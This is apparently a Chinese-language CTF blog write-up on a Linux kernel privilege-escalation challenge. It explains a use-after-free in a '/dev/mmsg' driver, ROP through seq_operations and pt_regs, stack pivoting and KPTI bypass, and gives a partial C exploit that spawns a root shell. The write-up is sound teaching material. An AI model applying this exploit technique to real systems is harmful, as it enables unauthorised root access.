href="https://blog.wingszeng.top/kernel-pwn-struct-seq-operations-and-struct-pt-regs/#%E4%BE%8B%E9%A2%98-2023-pwnhub-%E5%85%AC%E5%BC%80%E8%B5%9B-kheap">Kernel Pwn Struct seq_operations and Struct pt_regs</a></p><ul><li>è¿™ä¸€é¢˜å¼€å¯äº†smapï¼Œè€Œ pwnhub çš„é‚£ä¸€é¢˜ä¸­æ²¡æœ‰ã€‚è€Œsmap: kernel space ä¸èƒ½ access user space çš„ä¸œè¥¿ã€‚</li><li>è¿™ç¯‡æ–‡ç« ä¸­è¯´äº†ä¸€ä¸ª <code>pt_regs</code> çš„ç»“æ„ä½“ï¼Œåœ¨ä½¿ç”¨syscall æ—¶ï¼Œä¼šå°†æŸäº›å¯„å­˜å™¨å†…å®¹å‹å…¥<code>å†…æ ¸æ ˆçš„æ ˆåº•</code>.</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pt_regs</span> &#123;</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * C ABI says these regs are callee-preserved. They aren&#x27;t saved on kernel entry</span></span><br><span class="line"><span class="comment"> * unless syscall needs a complete, fully filled &quot;struct pt_regs&quot;.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> r15;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> r14;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> r13;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> r12;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> rbp;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> rbx;</span><br><span class="line"><span class="comment">/* These regs are callee-clobbered. Always saved on kernel entry. */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> r11;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> r10;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> r9;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> r8;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> rax;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> rcx;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> rdx;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> rsi;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> rdi;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * On syscall entry, this is syscall#. On CPU exception, this is error code.</span></span><br><span class="line"><span class="comment"> * On hw interrupt, it&#x27;s IRQ number:</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> orig_rax;</span><br><span class="line"><span class="comment">/* Return frame for iretq */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> rip;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> cs;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> eflags;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> rsp;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> ss;</span><br><span class="line"><span class="comment">/* top of stack page */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><blockquote><p>åœ¨ç³»ç»Ÿè°ƒç”¨çš„è¿‡ç¨‹ä¸­, ä¸æ˜¯æ‰€æœ‰çš„å¯„å­˜å™¨éƒ½ä¼šè¢«æ”¹å˜, æ¯”å¦‚ r8 - r15, ä»–ä»¬ä¼šåœ¨å‹å…¥ pt_regs çš„æ—¶ä¿æŒ syscall ä¹‹å‰çš„å€¼. è¿™å°±ä¸ºæˆ‘ä»¬æä¾›äº†å¸ƒç½®æ•°æ®çš„å¯èƒ½æ€§. å¦‚æœåœ¨ä»…èƒ½åŠ«æŒ rip çš„æƒ…å†µä¸‹ (æ¯”å¦‚ä¸Šé¢ä»‹ç»çš„ seq_operations), è·³è½¬åˆ°æŸä¸ªå½¢å¦‚Â <code>add, rsp val; ret</code>Â çš„ gadget, é‚£ä¹ˆå°±æœ‰å¯èƒ½å°† rsp è®¾ç½®åˆ°å†…æ ¸æ ˆçš„ pt_regs ä¸Š, ä»è€Œæ‰§è¡Œæˆ‘ä»¬å¸ƒç½®çš„ ROP é“¾.</p></blockquote><ul><li><p>ä¹Ÿå°±æ˜¯æˆ‘ä»¬ rop å¾€ å†…æ ¸æ ˆçš„ pt_regs ä¸­è·³è½¬ï¼Œå°±ä¸ä¼šç»•è¿‡äº†smap</p></li><li><p>å¦‚ä½•å°†å¯„å­˜å™¨å‹å…¥: ä½¿ç”¨äº†å·§å¦™åœ°æ–¹æ³•ï¼Œsyscall è°ƒç”¨ readï¼Œå°†å¯„å­˜å™¨å‹å…¥ï¼Œå¹¶ä¸”å¯ä»¥é€šè¿‡seq_operations-&gt;startæ‰§è¡Œrop</p></li><li><p>è°ƒç”¨æ¨¡æ¿+è§£é‡Šçš„æ¯”è¾ƒè¯¦ç»†çš„æ–‡ç« ï¼š<a href="https://ywhkkx.github.io/2023/02/19/seq_operations%20+%20pt_regs/">seq_operations+pt_regs</a></p></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">__asm__(  </span><br><span class="line">    <span class="string">&quot;mov r15, 0x55555555;&quot;</span>  </span><br><span class="line">    <span class="string">&quot;mov r14, 0x44444444;&quot;</span>  </span><br><span class="line">    <span class="string">&quot;mov r13, 0x33333333;&quot;</span>   </span><br><span class="line">    <span class="string">&quot;mov r12, 0x22222222;&quot;</span>  </span><br><span class="line">    <span class="string">&quot;mov rbp, 0xbbbb1111;&quot;</span></span><br><span class="line">    <span class="string">&quot;mov rbx, 0xbbbb2222;&quot;</span>  </span><br><span class="line">    <span class="string">&quot;mov r11, 0x11111111;&quot;</span>  </span><br><span class="line">    <span class="string">&quot;mov r10, 0x11110000;&quot;</span>  </span><br><span class="line">    <span class="string">&quot;mov r9,  0x99999999;&quot;</span>  </span><br><span class="line">    <span class="string">&quot;mov r8,  0x88888888;&quot;</span>  </span><br><span class="line">    <span class="string">&quot;xor rax, rax;&quot;</span>  </span><br><span class="line">    <span class="string">&quot;mov rcx, 0x666666;&quot;</span>  </span><br><span class="line">    <span class="string">&quot;mov rdx, 8;&quot;</span>  </span><br><span class="line">    <span class="string">&quot;mov rsi, rsp;&quot;</span>  </span><br><span class="line">    <span class="string">&quot;mov rdi, seq_fd;&quot;</span>  </span><br><span class="line">    <span class="string">&quot;syscall&quot;</span>  </span><br><span class="line">);</span><br></pre></td></tr></table></figure><ul><li>gadget: æ”¹å˜rsp, add rsp, xxx; retï¼Œè¿›è¡Œæ ˆè¿ç§»</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/2wi 0xffffffff81909b8c</span><br><span class="line">   0xffffffff81909b8c:  add    rsp,0x168</span><br><span class="line">   0xffffffff81909b93:  ret</span><br></pre></td></tr></table></figure><ul><li>ä½†æ˜¯æˆ‘ä»¬éœ€è¦äº‹å…ˆçŸ¥é“æ‰§è¡Œstart æ—¶ä¸pt_regs è·ç¦»å¤šè¿œã€‚<ul><li>ç›´æ¥ä½¿ç”¨æ²¡æœ‰å¸ƒå±€çš„è„šæœ¬ï¼Œè‡ªç„¶ä¼škernel panicï¼Œå¯ä»¥çœ‹åˆ°ripçš„å†…å®¹ï¼Œç„¶åä¸ä¸Šè¿°çš„payloadè¿›è¡Œå¯¹æ¯”ï¼Œè·å¾—åç§»</li></ul></li><li>å¹¶ä¸”è¿™å¹¶ä¸æ˜¯ä¸€ä¸ªä¸‡èƒ½çš„æ–¹æ³•</li></ul><h3 id="3"><a href="#3" class="headerlink" title="3"></a>3</h3><ul><li>åæ¥è¿˜æ˜¯ä¸å¯¹ï¼Œå› æ­¤å†çœ‹å‚è€ƒæ–‡ç« ï¼Œå¦‚ä¸‹ä¹Ÿå­˜åœ¨uafé—®é¢˜ã€‚</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// module_ioctl</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">mmsg_head</span> &#123;</span></span><br><span class="line">Â  Â  Â  Â  <span class="type">char</span> description[<span class="number">16</span>];</span><br><span class="line">Â  Â  Â  Â  <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">list</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">case</span> MMSG_RECV: </span><br><span class="line">        <span class="keyword">if</span> (arg.top) &#123;</span><br><span class="line">            m = list_entry(&amp;mmsg_head-&gt;<span class="built_in">list</span>, <span class="keyword">struct</span> mmsg, <span class="built_in">list</span>);  <span class="comment">// head</span></span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            m = find_mmsg(arg.token);   <span class="comment">// éå†æŸ¥è¯¢</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (m == <span class="literal">NULL</span> || arg.size &gt; m-&gt;size || arg.size &lt;= <span class="number">0</span>) &#123;</span><br><span class="line">            ret = -EINVAL;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        printk(KERN_INFO <span class="string">&quot;mmsg recv\n&quot;</span>);</span><br><span class="line">        copy_to_user((<span class="type">void</span> __user *)arg.data, m-&gt;data, arg.size);</span><br><span class="line">        list_del(&amp;m-&gt;<span class="built_in">list</span>);  <span class="comment">// åŒå‘é“¾è¡¨å…ƒç´ å†…æ ¸æä¾›çš„åˆ é™¤å‡½æ•°</span></span><br><span class="line">        kfree(m-&gt;data);      <span class="comment">// head æ²¡æœ‰ï¼Œä½†æ˜¯å›ºå®šåç§»ä¸º 0x10 çš„åœ°æ–¹ï¼Œç›¸å½“äºfreeæ‰listï¼Œä¸ä¼šæŠ¥é”™</span></span><br><span class="line">        kfree(m);          </span><br><span class="line">        <span class="keyword">break</span>;</span><br></pre></td></tr></table></figure><h3 id="4"><a href="#4" class="headerlink" title="4"></a>4</h3><h4 id="åç§»ç¡®å®š"><a href="#åç§»ç¡®å®š" class="headerlink" title="åç§»ç¡®å®š"></a>åç§»ç¡®å®š</h4><ul><li><p>add rsp valï¼Œæˆ‘ä»¬éœ€è¦ä¸€ä¸ªæ¯”è¾ƒå…·ä½“çš„å€¼</p></li><li><p>å¤§æ¦‚æ˜¯ <code>0x100+</code> çš„gadgetå§ï¼Œä¸å¤ªä¼šï¼Œä½†æ˜¯æ­¤ç»“æ„ä½“å¤§å°å¤§äº0x100ï¼Œå¹¶ä¸”è¦å¼€å¯syscallçš„æ ˆå¸§</p><ul><li>åº”è¯¥å¯ä»¥åœ¨ioctl ä¸‹æ–­ç‚¹ï¼Œä½†æ˜¯æˆ‘å¤±è´¥äº†ğŸ˜¥</li></ul></li></ul><h4 id="æ‰§è¡Œæµç¨‹"><a href="#æ‰§è¡Œæµç¨‹" class="headerlink" title="æ‰§è¡Œæµç¨‹"></a>æ‰§è¡Œæµç¨‹</h4><ul><li>ç›´æ¥çœ‹æŠ¥é”™:  BUG: unable to handle page fault for address: 0000000044444444 ï¼› RIP: 0010:0x44444444è·å¾—æˆ‘ä»¬ripæŒ‡é’ˆæ§åˆ¶çš„å¯„å­˜å™¨ r14</li><li>syscall ä¸ä¼šæ”¹å˜ r8-r15å†…å®¹ã€‚ç†æƒ³æƒ…å†µä¸‹r8-r15å†…å®¹ä¸å˜ï¼Œä½†æ˜¯å¯èƒ½ä¼šäº§ç”Ÿå¥‡å¦™çš„å˜åŒ–ã€‚è°ƒè¯•ï¼Œsiä¼šèµ°åˆ°startæŒ‡é’ˆçš„æ“ä½œï¼Œä»è€Œè·å¾—æ ˆç»“æ„</li><li>å‡è®¾ç†æƒ³åŒ–ä»r14-r8æ²¡æœ‰å‘ç”Ÿæ”¹å˜</li><li>si ä¸€è·¯èµ°ï¼Œä½†æ˜¯çœ‹ä¸åˆ°å¯¹åº”å†…å®¹?</li></ul><p><a href="https://b0ldfrev.gitbook.io/note/linux_kernel/kernelpwn-zhuang-tai-qie-huan-yuan-li-ji-kpti-rao-guo#0x2-bypass-kpti">KERNEL_PWNçŠ¶æ€åˆ‡æ¢åŸç†åŠKPTIç»•è¿‡</a></p><ul><li>swapgs; iretq è¿”å›ç”¨æˆ·æ€; ret rip,åœ¨æ­¤å¤„æ²¡æœ‰ä½¿ç”¨retæŒ‡ä»¤ï¼Œç›´æ¥iretq, ç›´æ¥r9ä¸ºuser_rspå°±è¡Œ</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">swapgs            </span><br><span class="line">iretq             </span><br><span class="line">rsp ---&gt; rip </span><br><span class="line">         cs</span><br><span class="line">         rflags</span><br><span class="line">         rsp</span><br><span class="line">         ss</span><br></pre></td></tr></table></figure><ul><li>swapgs_restore_regs_and_return_to_usermode: è¿™ä¸ªæ¯”ä¸Šä¸ªå¤æ‚ä¸€ç‚¹ï¼Œéœ€è¦åœ¨è¿ç§»ä¸€æ¬¡</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">swapgs_restore_regs_and_return_to_usermode + 22  </span><br><span class="line">0 // padding  </span><br><span class="line">0 // padding  </span><br><span class="line">get_shell</span><br><span class="line">user_cs  </span><br><span class="line">user_rflags  </span><br><span class="line">user_sp</span><br><span class="line">user_ss</span><br></pre></td></tr></table></figure><h4 id="errors"><a href="#errors" class="headerlink" title="errors"></a>errors</h4><ol><li>qemu cpuä¸º <code>host</code> ä¹Ÿå¿…é¡»å¼€å¯kvm, åŒæ—¶å°±æ˜¯è¿™ä¸€ç‚¹ï¼Œå¯¼è‡´æˆ‘ä¸€ç›´ä¸æˆåŠŸï¼Œåæ¥å»é™¤æ‰kvmå°†cpuæ”¹ä¸ºkvm64æˆåŠŸã€‚åº”è¯¥æ˜¯æœ¬æœºçš„CPUçš„å®‰å…¨é˜²æŠ¤å¯¼è‡´ä¸€ç›´å¤±è´¥ğŸ˜¥ã€‚</li></ol><h4 id="exploit"><a href="#exploit" class="headerlink" title="exploit"></a>exploit</h4><ul><li>signal bypass kptiã€‚æ‰§è¡Œç”¨æˆ·æ€çš„ä»»æ„ä»£ç éƒ½ä¼šæŠ¥å‡ºä¿¡å·<code>SIGSEGV</code>ï¼Œé‚£ä¹ˆåœ¨ç¨‹åºå¼€å§‹æ—¶å°†<code>SIGSEGV</code>ä¸shellå‡½æ•°ç»‘å®šåœ¨ä¸€èµ·ï¼Œé‚£ä¹ˆè®¿é—®ç”¨æˆ·æ€ä»£ç æ—¶å°±ä¼šæŠ¥å‡ºä¿¡å·<code>SIGSEGV</code>ï¼Œå°±ä¼šæ‰§è¡Œä¿¡å·å‡½æ•°ã€‚</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> COLOR_GREEN <span class="string">&quot;\033[32m&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> COLOR_RED <span class="string">&quot;\033[31m&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> COLOR_YELLOW <span class="string">&quot;\033[33m&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> COLOR_DEFAULT <span class="string">&quot;\033[0m&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> log_debug(fmt, ...)                                                    \</span></span><br><span class="line"><span class="meta">  dprintf(2, <span class="string">&quot;[*] %s:%d &quot;</span> fmt <span class="string">&quot;\n&quot;</span>, __FILE__, __LINE__, ##__VA_ARGS__)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> log_info(fmt, ...)                                                     \</span></span><br><span class="line"><span class="meta">  dprintf(2, COLOR_GREEN <span class="string">&quot;[+] %s:%d &quot;</span> fmt <span class="string">&quot;\n&quot;</span> COLOR_DEFAULT, __FILE__,        \</span></span><br><span class="line"><span class="meta">          __LINE__, ##__VA_ARGS__)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> log_warning(fmt, ...)                                                  \</span></span><br><span class="line"><span class="meta">  dprintf(2, COLOR_YELLOW <span class="string">&quot;[!] %s:%d &quot;</span> fmt <span class="string">&quot;\n&quot;</span> COLOR_DEFAULT, __FILE__,       \</span></span><br><span class="line"><span class="meta">          __LINE__, ##__VA_ARGS__)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> log_error(fmt, ...)                                                    \</span></span><br><span class="line"><span class="meta">  dprintf(2, COLOR_RED <span class="string">&quot;[-] %s:%d &quot;</span> fmt <span class="string">&quot;\n&quot;</span> COLOR_DEFAULT, __FILE__,          \</span></span><br><span class="line"><span class="meta">          __LINE__, ##__VA_ARGS__)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> die(fmt, ...)                  \</span></span><br><span class="line"><span class="meta">  do &#123;                                 \</span></span><br><span class="line"><span class="meta">    log_error(fmt, ##__VA_ARGS__);          \</span></span><br><span class="line"><span class="meta">    log_error(<span class="string">&quot;Exit at line %d&quot;</span>, __LINE__); \</span></span><br><span class="line"><span class="meta">    exit(1);                           \</span></span><br><span class="line"><span class="meta">  &#125; while (0)</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">get_shell</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"> <span class="keyword">if</span>( getuid() ) &#123;</span><br><span class="line">  die(<span class="string">&quot;fail to get shell&quot;</span>);</span><br><span class="line"> &#125;</span><br><span class="line">    log_info(<span class="string">&quot;start to get root shell&quot;</span>);</span><br><span class="line"> system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line"> <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> user_cs, user_ss, user_rflags, user_rsp;</span><br><span class="line"><span class="type">void</span> <span class="title function_">save_status</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    __asm__(<span class="string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_rsp, rsp;&quot;</span></span><br><span class="line">            <span class="string">&quot;pushf;&quot;</span></span><br><span class="line">            <span class="string">&quot;pop user_rflags;&quot;</span></span><br><span class="line">            );</span><br><span class="line">    log_info(<span class="string">&quot;status saved&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">seq_open</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"> <span class="type">int</span> seq;</span><br><span class="line"> <span class="keyword">if</span> ( (seq=open(<span class="string">&quot;/proc/self/stat&quot;</span>, O_RDONLY)) == <span class="number">-1</span>) &#123;</span><br><span class="line">  die(<span class="string">&quot;seq open fail&quot;</span>);</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">return</span> seq;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MMSG_ALLOC 0x1111111</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MMSG_COPY 0x2222222</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MMSG_RECV 0x3333333</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MMSG_UPDATE 0x4444444</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MMSG_PUT_DESC 0x5555555</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MMSG_GET_DESC 0x6666666</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">mmsg_arg</span> &#123;</span></span><br><span class="line">        <span class="type">unsigned</span> <span class="type">long</span> token;</span><br><span class="line">        <span class="type">int</span> top;</span><br><span class="line">        <span class="type">int</span> size;</span><br><span class="line">        <span class="type">char</span> *data;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> kernel_base = <span class="number">0</span>;</span><br><span class="line"><span class="type">size_t</span> kernel_offset = <span class="number">0</span>;</span><br><span class="line"><span class="type">size_t</span> nokaslr = <span class="number">0xffffffff81000000</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> prepare_kernel_cred = <span class="number">0xffffffff9248d790</span>;</span><br><span class="line"><span class="type">size_t</span> commit_creds = <span class="number">0xffffffff8108d350</span>;</span><br><span class="line"><span class="type">size_t</span> swapgs_restore_regs_and_return_to_usermode = <span class="number">0xffffffff93000e30</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> pop_rdi_ret = <span class="number">0xffffffff811aa376</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> init_cred = <span class="number">0xffffffff8264c9a0</span>;</span><br><span class="line"><span class="type">size_t</span> swapgs_iretq = <span class="number">0xffffffff81c00ec6</span>;</span><br><span class="line"><span class="type">size_t</span> add_rsp_0x168_ret = <span class="number">0xffffffff81909b8c</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> mmsg_fd;</span><br><span class="line"><span class="type">int</span> seq_fd;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">exploit</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">    log_info(<span class="string">&quot;open device&quot;</span>);</span><br><span class="line">    mmsg_fd = open(<span class="string">&quot;/dev/mmsg&quot;</span>, O_RDWR);</span><br><span class="line">    <span class="keyword">if</span> (mmsg_fd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        die(<span class="string">&quot;open device&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">mmsg_arg</span> <span class="title">arg</span>;</span></span><br><span class="line">    arg.token = <span class="number">1</span>;</span><br><span class="line">    arg.top = <span class="number">1</span>;</span><br><span class="line">    arg.size = <span class="number">16</span>;</span><br><span class="line">    arg.data = <span class="built_in">malloc</span>(<span class="number">16</span>);</span><br><span class="line">    <span class="type">size_t</span> *buf = (<span class="type">size_t</span> *)arg.data;</span><br><span class="line">    buf[<span class="number">0</span>] = <span class="number">0x1145141145141145</span>ull;</span><br><span class="line">    buf[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">    ioctl(mmsg_fd, MMSG_PUT_DESC, &amp;arg);  <span class="comment">// bypass size check</span></span><br><span class="line">    ioctl(mmsg_fd, MMSG_RECV, &amp;arg);     <span class="comment">// free head</span></span><br><span class="line"></span><br><span class="line">    seq_fd = seq_open();</span><br><span class="line"></span><br><span class="line">    